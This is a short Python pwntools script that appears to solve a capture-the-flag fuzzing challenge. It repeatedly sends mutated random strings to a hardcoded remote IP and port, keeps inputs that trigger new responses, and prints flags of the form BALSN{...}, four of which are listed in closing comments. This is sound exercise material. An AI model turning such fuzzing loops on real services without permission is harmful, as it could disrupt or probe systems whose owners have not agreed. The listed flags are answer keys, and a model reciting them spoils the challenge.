# python 3
from pwn import*
import time
import fuzzing

def check(str):
	ret = 1
	for k in range(len(str)):
		if k % 2 == 0 and str[k].isdigit(): continue
		if k % 2 == 1 and str[k] == "-": continue
		ret = 0
		break
	return ret

### Get Initial Fuzzing String
cnt = ""
random.seed(0)
for k in range(20):
	cnt += chr(random.randint(0,255))

### Start Fuzzing
con, ini = 0, time.time()
flg, rec = 0, []
qq = 0
while flg != 5:
	if time.time() - ini >= 5:
		con = 0
		r.close()

	if con == 0:
		con = 1
		ini = time.time()
		r = remote("140.112.31.97", 10160)
	

	txt = cnt
	txt = fuzzing.fuzz_string(txt, 1, 7)[0]
	r.sendline(txt)
	res = r.recv().decode("utf-8")

	for ara in res.split():
		if ara not in rec and check(ara) == 1: 
			cnt = txt
			rec.append(ara)
			print (ara)
		if ara not in rec and ara[0:6] == "BALSN{" and ara[-1] == "}": 
			rec.append(ara)
			print (ara)
			flg += 1
	
# flag: BALSN{This_!5_7h3_34sy_onE}
# flag: BALSN{FUzziNG_i5_S0_Fun!}
# flag: BALSN{G0od_LucK_K33P_Try!nG}
# flag: BALSN{FuzZZZzzzZZzzZzZZZZZzz!nGGG}